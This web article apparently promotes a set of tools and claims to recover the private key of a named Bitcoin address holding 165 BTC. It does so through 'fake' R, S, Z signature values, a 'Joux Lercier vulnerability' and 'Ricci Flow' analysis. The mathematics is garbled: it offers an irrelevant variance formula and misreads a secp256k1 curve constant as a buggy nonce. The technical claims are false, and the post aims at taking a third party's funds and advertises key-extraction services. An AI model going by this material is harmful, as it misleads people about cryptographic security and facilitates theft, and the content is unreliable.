
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/GOLD1031B-1024x576.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5107"></figure></div>


<p></p>



<p>In early 2025, the rise in the rate of popular cryptocurrencies had a significant impact on financial transactions. Despite their widespread use and apparent security, these systems remain vulnerable. One of the main problems remains the recovery of lost cryptocurrency wallets and private keys, which can be done using complex mathematical algorithms.</p>



<p>In this article, we will explore methods for solving the discrete logarithm problem and ways to recover lost Bitcoin wallets, focusing on the Ricci Flow algorithm and the Hidden Number Problem for extracting private keys from vulnerable transactions using ECDSA. We will also discuss how modern cryptocurrencies such as Bitcoin and Ethereum rely on complex mathematical foundations that provide security and anonymity, but are susceptible to exploitation due to various vulnerabilities.</p>



<p><strong>The Role of Discrete Logarithms in Recovering Lost Cryptocurrency Wallets and Extracting Private Keys</strong>&nbsp;.</p>



<p><strong><a href="https://en.wikipedia.org/wiki/Discrete_logarithm" target="_blank" rel="noreferrer noopener">Discrete logarithm</a></strong> is a mathematical problem that consists of finding an integer <strong><em><code>x</code></em></strong> satisfying the equation <strong><code><em>a=b^x</em></code></strong> in some finite group. The order of the group of points on this curve is an important parameter determining the cryptographic strength of the <strong><code><em>secp256k1</em></code></strong> elliptic curve system over the field <strong><em><code>GF(p)</code></em></strong>, where <strong><code><em>p=2^256−2^32−2^9−2^8−2^7−2^6−2^4−1</em></code></strong>. For example, if we know <strong><em><code>a</code></em></strong> and <strong><em><code>b</code></em></strong>, we need to find <strong><em><code>x</code></em></strong>, the private key to a Bitcoin wallet. This problem is especially important in cryptography, since it underlies many cryptographic algorithms, such as public key exchange. Modern discrete logarithm algorithms have very high computational power, which allows these algorithms to be used in practice.</p>



<p></p>



<p></p>



<p>Let’s look at the process of recovering a private key using&nbsp;<strong><a href="https://dockeyhunt.com/dockeyhunt-discrete-logarithm/" target="_blank" rel="noreferrer noopener">Dockeyhunt Discrete Logarithm</a></strong><strong>&nbsp;software and DarkSignature</strong>&nbsp;tool&nbsp;to generate fake transaction data.</p>



<p>First, we will enter the Bitcoin wallet address:&nbsp;<strong><a href="https://btc1.trezor.io/address/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS" target="_blank" rel="noreferrer noopener">1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</a></strong>&nbsp;for the amount of:&nbsp;<strong><a href="https://btc1.trezor.io/address/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS" target="_blank" rel="noreferrer noopener">165.10252195 BTC</a></strong>&nbsp;and get its public key. Then, using&nbsp;<strong>DarkSignature</strong>&nbsp;, we will create fake values ​​for transactions, which will allow us to analyze and manipulate the signature data of the ECDSA algorithm. Finally, we will apply mathematical analysis through the&nbsp;<strong><a href="https://perelmanwork.com/" target="_blank" rel="noreferrer noopener">Perelman Work</a></strong>&nbsp;software to solve the discrete logarithm and get the private key to the Bitcoin wallet.</p>



<p>This article is intended not only for cryptography and mathematics experts, but also for anyone who wants to understand how mathematical methods can be used to solve real-world cryptanalysis problems using various cryptocurrencies.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://www.youtube.com/watch?v=i9KYih_ffr8"><img decoding="async" width="749" height="432" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-1.png" alt="Discrete Logarithms" class="wp-image-3137" style="width:840px;height:auto" srcset="https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-1.png 749w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-1-300x173.png 300w" sizes="(max-width: 749px) 100vw, 749px"></a></figure></div>


<p></p>







<hr class="wp-block-separator has-alpha-channel-opacity">



<p>First, we need to run the&nbsp;<a href="https://dockeyhunt.com/dockeyhunt-discrete-logarithm" target="_blank" rel="noreferrer noopener"><strong>Dockeyhunt Discrete Logarithm</strong></a>&nbsp;software and&nbsp;<code><strong>"Input date"</strong></code>enter the Bitcoin Address&nbsp;<a href="https://btc1.trezor.io/address/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS" target="_blank" rel="noreferrer noopener"><strong>1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</strong></a>&nbsp;in the field and get the public key of the wallet:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-11910058ecc209480e8f96491843ac6e" style="color:#4092c2"><code><strong>04e87e83f871df1439b7873b4ae449d15306cafc53e03a06fffb534b3bf25b58d8edca74b0faf5cf8c3aed6cad2bd79a7bce92ab53e07440d4590cbf31286d9335</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-1-1024x573.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-258"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=63">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>Let’s use the DarkSignature</strong>&nbsp;tool to get fake&nbsp;<strong>R, S, Z</strong>&nbsp;values&nbsp;​​for the ECDSA algorithm transaction. In the field,&nbsp;<code>"Input date"</code>enter the public key of the Bitcoin Address and get the values <strong>R, S, Z</strong></p>



<p class="has-text-color has-link-color wp-elements-4d58c3aa418a19369b0ffbae46da84ac" style="color:#4092c2"><strong><code>04e87e83f871df1439b7873b4ae449d15306cafc53e03a06fffb534b3bf25b58d8edca74b0faf5cf8c3aed6cad2bd79a7bce92ab53e07440d4590cbf31286d9335</code></strong></p>



<p>Result:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-f8ff710280f83a94fbf585529b9da688" style="color:#4092c2"><code><strong>1111,947d6fb75033cc3e342c8538a350e9058134b2a1ae01a7c50fc52b1f56c9169c,5b3ec0d72a2368cdd48c17ff095ab1ab0b9824e010883539cbeb18141de6384b,c7ac826c5a8397c0de993b2d8d597be42d22c77cf006683d7b72a197e1a5cdcf,0000</strong>
</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-2-1024x573.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-259"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=76" target="_blank" rel="noreferrer noopener">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://perelmanwork.com/" target="_blank" rel="noreferrer noopener">As a tool for mathematical analysis and solving discrete logarithm equations, we will use the Perelman Work</a></strong>&nbsp;software&nbsp;. We will select the option from the&nbsp;<strong>Complex Analysis</strong>&nbsp;section for a complete relationship between variables through the integration of&nbsp;</p>



<p><strong><code>Discrete variation series Variance: [ D = frac{sum_{i=1}^{n} (x_i — bar{x})^2}{N})]</code></strong></p>



<p>The formula for calculating discrete variation looks like this:</p>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-1(1).png" alt="Discrete variation series Variance formula: [ D = frac{sum_{i=1}^{n} (x_i - bar{x})^2}{N} ) ]" class="wp-image-1376" style="width:458px;height:auto"></figure></div>


<h3 class="wp-block-heading">Explanation of the formula components:</h3>



<ul class="wp-block-list">
<li><strong>D</strong>&nbsp;&nbsp;is the variance (variance) of your data set.</li>



<li><strong>∑∑</strong>&nbsp;&nbsp;is the sum symbol, which means that we will add the values.</li>



<li><strong><em>i</em></strong>&nbsp;&nbsp;is an index that runs through all values ​​in the data set from 1 to n.</li>



<li><strong><em>xi</em>&nbsp;​is</strong>&nbsp;each individual value in your data set.</li>



<li><strong>ˉ&nbsp;<em>x</em>&nbsp;ˉ</strong>&nbsp;&nbsp;is the mean (or arithmetic average) of all the values ​​in the data set.</li>



<li><strong><em>N</em></strong>&nbsp;&nbsp;is the total number of values ​​in the data set.</li>
</ul>



<h3 class="wp-block-heading">How does this work?</h3>



<ol class="wp-block-list">
<li><strong>Calculating the Average:</strong>&nbsp;&nbsp;First, you find the average value of your data set.</li>



<li><strong>Difference from mean:</strong>&nbsp;&nbsp;Then for each value&nbsp;&nbsp;<em>xi</em>​ you calculate how much it differs from the mean ˉ&nbsp;<em>x</em>&nbsp;ˉ .</li>



<li><strong>Square the difference:</strong>&nbsp;&nbsp;You then take the square of that difference (to get rid of negative values ​​and amplify the impact of large deviations).</li>



<li><strong>Summation:</strong>&nbsp;&nbsp;You add up all the squares of the differences.</li>



<li><strong>Dividing by the number of values:</strong>&nbsp;&nbsp;Finally, you divide the resulting sum by the total number of values&nbsp;&nbsp;<em>​​N</em>&nbsp;.</li>
</ol>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-4-1024x576.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-261"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=146">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><em>Using&nbsp;<a href="https://perelmanwork.com/" target="_blank" rel="noreferrer noopener"><strong>Perelman Work</strong></a>&nbsp;and&nbsp;<strong><a href="https://dockeyhunt.com/dockeyhunt-discrete-logarithm" target="_blank" rel="noreferrer noopener"><strong>Dockeyhunt Discrete Logarithm,</strong></a></strong>&nbsp;we arbitrarily change variables to the&nbsp;<strong><a href="https://cryptodeeptech.ru/discrete-logarithm" target="_blank" rel="noreferrer noopener">Joux Lercier</a></strong>&nbsp;vulnerability , this is described in detail at the beginning of&nbsp;<a href="https://cryptodeeptech.ru/discrete-logarithm" target="_blank" rel="noreferrer noopener">the article,</a>&nbsp;this vulnerability in a Bitcoin transaction occurs due to the fact that it is possible to change the value of&nbsp;&nbsp;<strong>R,&nbsp;</strong><strong>S</strong>&nbsp;,&nbsp;<strong>Z</strong>&nbsp;&nbsp;in the signature, while maintaining the validity of the signature, as well as in an arbitrary formula:</em></p>



<p class="has-text-align-center has-large-font-size"><code><em>X</em>=hex(((<em>S</em>⋅<em>K</em>−<em>Z</em>)⋅modinv(<em>R</em>,<em>N</em>))mod<em>N</em>)</code></p>



<ul class="wp-block-list">
<li><em>S</em>&nbsp;&nbsp;and&nbsp;&nbsp;<em>R</em>&nbsp;&nbsp;are the values ​​from the transaction signature (RawTX).</li>



<li><em>Z</em>&nbsp;&nbsp;is the transaction signature hash.</li>



<li><em>K</em>&nbsp;&nbsp;is the secret key (nonce).</li>



<li><em>N</em>&nbsp;&nbsp;is the order of the elliptic curve group.</li>



<li>modinv(&nbsp;<em>R</em>&nbsp;,&nbsp;<em>N</em>&nbsp;) is the modular inverse function of&nbsp;&nbsp;<em>R</em>&nbsp;&nbsp;modulo&nbsp;&nbsp;<em>N</em>&nbsp;.</li>
</ul>



<h3 class="wp-block-heading">Explanation of the formula</h3>



<ol class="wp-block-list">
<li><strong>Input parameters</strong>&nbsp;:
<ul class="wp-block-list">
<li><strong><em>S</em></strong>&nbsp;&nbsp;and&nbsp;<strong><em>&nbsp;R</em></strong>&nbsp;: These values ​​are obtained from the transaction signature. They are needed to recover the private key.</li>



<li><strong><em>Z</em></strong>&nbsp;: This is the signature hash, which is also used in the process.</li>



<li><strong><em>K</em></strong>&nbsp;: A secret key (nonce) that should only be known to the wallet owner.</li>
</ul>
</li>



<li><strong>Calculations</strong>&nbsp;:
<ul class="wp-block-list">
<li>First we&nbsp;&nbsp;multiply&nbsp;<em>S</em>&nbsp;&nbsp;by&nbsp;&nbsp;<em>K.</em></li>



<li>Then we subtract&nbsp;&nbsp;<em>Z</em>&nbsp;.</li>



<li>The result is multiplied by the modular inverse&nbsp; of&nbsp;<em>R</em>&nbsp;&nbsp;modulo&nbsp;&nbsp;<em>N</em>&nbsp;. This allows us to “cancel” the influence of&nbsp;&nbsp;<em>R</em>&nbsp;to obtain a value that can be used to calculate the private key.</li>



<li>Finally, the result is taken modulo&nbsp;&nbsp;<em>N</em>&nbsp;to ensure that it is within the acceptable range for private key values.</li>
</ul>
</li>



<li><strong>Convert to hexadecimal format</strong>&nbsp;:
<ul class="wp-block-list">
<li>After all the mathematical operations are performed, the result is converted to hexadecimal format using the function&nbsp;&nbsp;<code>hex()</code>, which is the standard representation of private keys in Bitcoin.</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><a href="https://perelmanwork.com/discrete-logarithm-ricci-flow-hnp" target="_blank" rel="noreferrer noopener">Ricci Flow Hidden Number Problem</a></h2>



<p>Copy the values&nbsp;<strong><code>R, S, Z</code></strong>​​and paste them into the input field&nbsp;<code><strong>Ricci Flow HNP</strong></code>to build completely new transactions of the&nbsp;<strong>ECDSA</strong>&nbsp;algorithm .</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-3-1024x570.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-260"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=173" target="_blank" rel="noreferrer noopener">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-5-1024x575.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-264"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><strong><a href="https://dockeyhunt.com/dockeyhunt-private-key-calculator/" target="_blank" rel="noreferrer noopener">Dockeyhunt Private Key Calculator</a></strong></h2>



<p>Copy the values ​​and paste them into the&nbsp;<strong><a href="https://dockeyhunt.com/dockeyhunt-private-key-calculator/" target="_blank" rel="noreferrer noopener">Dockeyhunt Private Key Calculator</a></strong><strong><code>R, S, Z</code></strong>&nbsp;software field<strong><a href="https://dockeyhunt.com/dockeyhunt-private-key-calculator/" target="_blank" rel="noreferrer noopener"></a></strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-6-1024x575.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-265"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=258">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Now, according to&nbsp;<em>the vulnerability&nbsp;<strong><a href="https://cryptodeeptech.ru/discrete-logarithm" target="_blank" rel="noreferrer noopener">of Joux Lercier,</a></strong>&nbsp;we copy from the code of&nbsp;<a href="https://github.com/bitcoin-core/secp256k1/blob/master/src/ecdsa_impl.h" target="_blank" rel="noreferrer noopener"><strong>ecdsa_impl.h</strong></a></em>&nbsp;the value of the secret key “K” called in cryptography NONCE – this is a secret, (pseudo) random parameter, which is usually denoted by “K”. Here NONCE, due to&nbsp;<a href="https://github.com/bitcoin-core/secp256k1/blob/master/src/ecdsa_impl.h" target="_blank" rel="noreferrer noopener">a bug in the code</a>&nbsp;, fixed&nbsp;<code><strong>0, 0, 0, 1, 0x45512319UL, 0x50B75FC4UL, 0x402DA172UL, 0x2FC9BAEEUL</strong></code> several&nbsp;<a href="https://github.com/bitcoin-core/secp256k1/blob/master/src/ecdsa_impl.h" target="_blank" rel="noreferrer noopener"><strong>HEX</strong></a>&nbsp;bits at the beginning (or at the end) of the record.</p>



<p><strong>!./darksignature -address 1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-5ccd751f271d981ae42081aab22e4aa7" style="color:#4092c2"><code><strong>....
....
....
/** Difference between field and order, values 'p' and 'n' values defined in
 *  "Standards for Efficient Cryptography" (SEC2) 2.7.1.
 *  $ sage -c 'load("secp256k1_params.sage"); print(hex(P-N))'
 *  0x14551231950b75fc4402da1722fc9baee
 */
static const secp256k1_fe secp256k1_ecdsa_const_p_minus_order = SECP256K1_FE_CONST(
    0, 0, 0, 1, 0x45512319UL, 0x50B75FC4UL, 0x402DA172UL, 0x2FC9BAEEUL
);
....
....
....</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-7-1024x576.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-267"><figcaption class="wp-element-caption"><strong><a href="https://github.com/bitcoin-core/secp256k1/blob/master/src/ecdsa_impl.h" target="_blank" rel="noreferrer noopener">https://github.com/bitcoin-core/secp256k1/blob/master/src/ecdsa_impl.h</a></strong></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-8-1024x577.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-269"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=289">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Copy the&nbsp;<strong>K value and paste it into the&nbsp;</strong><strong><a href="https://dockeyhunt.com/dockeyhunt-private-key-calculator/" target="_blank" rel="noreferrer noopener">Dockeyhunt Private Key Calculator</a></strong>&nbsp;software field&nbsp;, then click on the button:&nbsp;<strong>Calculate Private Key</strong>&nbsp;and get the private key to the Bitcoin Wallet&nbsp;<a href="https://btc1.trezor.io/address/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS" target="_blank" rel="noreferrer noopener"><strong>1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</strong></a></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-9d20aa28621489371c437c08a19c5c64" style="color:#4092c2"><code><strong>0x6b29781e725708ae4d94e13730a2718ee3383ea5d911e77d4c2a2fd0c99c1232</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-9-1024x576.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-270"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p></p>
</blockquote>



<p>To start&nbsp;<em>the algorithm for solving the discrete logarithm,</em>&nbsp;click on the button:&nbsp;<strong><code>Private Key</code></strong> after that, we successfully receive a private key in&nbsp;<strong>HEX format</strong></p>



<pre class="wp-block-code has-white-background-color has-text-color has-background has-link-color wp-elements-97b2b53b553edcfec4d450bfce140429" style="color:#4092c2"><code><strong>6b29781e725708ae4d94e13730a2718ee3383ea5d911e77d4c2a2fd0c99c1232</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-10-1024x576.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-273"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=309">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Next we need to make sure that we have received the required private key value in&nbsp;<strong>HEX format.</strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-11-1024x576.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-274"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=378">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Click on the button&nbsp;<strong><code>Bitcoin Address</code></strong>and get the required value of the private key in&nbsp;<strong>HEX format</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-ec86aca25b8ce356c0b6386161abe555" style="color:#4092c2"><code><strong>6b29781e725708ae4d94e13730a2718ee3383ea5d911e77d4c2a2fd0c99c1232: 1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-12-1024x576.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-275"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=324">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>We also click on the button&nbsp;<strong><code>Balance BTC</code></strong> and get the result of the balance amount:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-fa8633ecad20845d2c0ce232af1fb30d" style="color:#4092c2"><code><strong>6b29781e725708ae4d94e13730a2718ee3383ea5d911e77d4c2a2fd0c99c1232: 1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS: 165.10252195 BTC
_____________________________________________________________________________________________________
</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-13-1024x576.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-276"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=330">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-14-1024x576.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-277"><figcaption class="wp-element-caption"><em><a href="https://youtu.be/ErjCph1mI9Y?t=366">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center has-text-color has-link-color has-large-font-size wp-elements-d814c7804ab404e79fd861e72594ebbd" style="color:#108258"><strong>Private key received!</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Bitcoin wallet recovery using mathematically based methods such as&nbsp;<strong>the Ricci Flow Hidden Number Problem opens new horizons for understanding cryptographic vulnerabilities and opportunities. We demonstrated how&nbsp;</strong><strong>Perelman Work, Dockeyhunt Discrete Logarithm</strong>&nbsp;, and&nbsp;<strong>DarkSignature</strong>&nbsp;software can be used&nbsp;to extract private keys and create fake transactions, highlighting the importance of mathematical analysis in the cryptocurrency space.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://www.youtube.com/watch?v=ErjCph1mI9Y"><img decoding="async" width="746" height="426" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-4.png" alt="Discrete Logarithms" class="wp-image-3142" style="width:840px;height:auto" srcset="https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-4.png 746w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-4-300x171.png 300w" sizes="(max-width: 746px) 100vw, 746px"></a></figure></div>






<p>The results show that even in a complex system like&nbsp;<strong>Bitcoin</strong>&nbsp;, there are vulnerabilities that can be exploited to restore access to lost funds. This process requires deep knowledge of cryptography and mathematics, as well as skills in working with specialized software.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">Exploitation mechanisms and significant influence in multi-signature systems</h3>



<p>The vulnerability of the&nbsp;<strong>Joux Lercier</strong>&nbsp;algorithm poses a serious threat to systems with multi-signature schemes, since an attacker can generate fake signatures that the system will accept, threatening not only individual transactions, but also the integrity of the entire multi-signature process. An attacker can generate fake signatures that the system will accept, threatening not only individual transactions, but also the entire multi-signature process.</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>Insufficient verification of user input data can cause serious failures in the Bitcoin system, giving attackers the opportunity to inject malicious code and manipulate the system by creating fake signatures for transactions.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><a href="https://github.com/demining/CryptoDeepTools/blob/main/37DiscreteLogarithm/Joux_Lercier_Vulnerability_Algorithm_and_Tools_for_Extracting_Private_Key.ipynb" target="_blank" rel="noreferrer noopener">Practical part</a></h2>



<p>According to the theory&nbsp;<a href="https://cryptodeeptech.ru/discrete-logarithm" target="_blank" rel="noreferrer noopener">of vulnerability of the Joux Lercier algorithm</a>&nbsp;, attackers are able to use the identified flaws to attack the Bitcoin network, overloading it with invalid transactions and thereby disrupting its stability. Let’s move on to the practical part of the article and consider an example using a Bitcoin wallet:&nbsp;<a href="https://btc1.trezor.io/address/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS"><strong>1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</strong></a>&nbsp;, where there were lost coins in the amount of:&nbsp;<strong>165.10252195 BTC</strong>&nbsp;as of December 2024, this amount is:&nbsp;<strong>15802506.39 USD</strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-1024x382.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5018"><figcaption class="wp-element-caption"><strong>165.10252195 &gt; 15802506,39 USD</strong></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading has-text-align-center"><a href="https://github.com/demining/Tutorials-Power-AI" target="_blank" rel="noreferrer noopener">Tutorials Power AI</a></h3>



<p>Let’s use the list from&nbsp;<a href="https://github.com/demining/Tutorials-Power-AI" target="_blank" rel="noreferrer noopener">“Tutorials Power AI”</a>&nbsp;a widely used category of artificial intelligence to introduce business in various fields of cryptanalysis and cryptography in general.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong><em>Installation command:</em></strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-f0946a14b11461b3e0cc0f3f342dabfd" style="color:#4092c2"><code><strong>git clone https://github.com/demining/Tutorials-Power-AI.git

cd Tutorials-Power-AI/

python3 tutorials.py</strong>
</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/process.gif" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="276" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-1024x276.png" alt="Discrete Logarithms" class="wp-image-3118" srcset="https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-1024x276.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-300x81.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-768x207.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image.png 1431w" sizes="auto, (max-width: 1024px) 100vw, 1024px"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong><a href="https://bitcoinchatgpt.org/" target="_blank" rel="noreferrer noopener">BitcoinChatGPT</a></strong>&nbsp;is an innovative and cutting-edge AI-powered chatbot that helps users identify vulnerabilities in Bitcoin transactions. This tool allows you to check Bitcoin addresses for various crypto wallet attacks, using machine learning and cryptanalysis techniques to deeply investigate the security algorithms in the Bitcoin ecosystem. In addition, BitcoinChatGPT serves as an important resource for cybersecurity, offering tools to extract private keys from Bitcoin Wallet ledgers.</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><a href="https://cryptodeeptech.ru/discrete-logarithm" target="_blank" rel="noreferrer noopener">Exploiting a vulnerability in the implementation of the algorithm (Joux Lercier) to create a Raw transaction using the BitcoinChatGPT machine learning process</a></h2>



<p>Let’s consider the construction of the structure of a vulnerable&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/37DiscreteLogarithm/RawTX.txt" target="_blank" rel="noreferrer noopener">Raw</a></strong>&nbsp;transaction in which the&nbsp;<strong><a href="https://bitcoinchatgpt.org/joux-lercier-vulnerability-algorithm/" target="_blank" rel="noreferrer noopener">BitcoinChatGPT module is used</a></strong></p>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://www.youtube.com/watch?v=vI-S3ua0QEA"><img loading="lazy" decoding="async" width="749" height="428" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-2.png" alt="Discrete Logarithms" class="wp-image-3140" style="width:840px;height:auto" srcset="https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-2.png 749w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-2-300x171.png 300w" sizes="auto, (max-width: 749px) 100vw, 749px"></a></figure></div>






<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
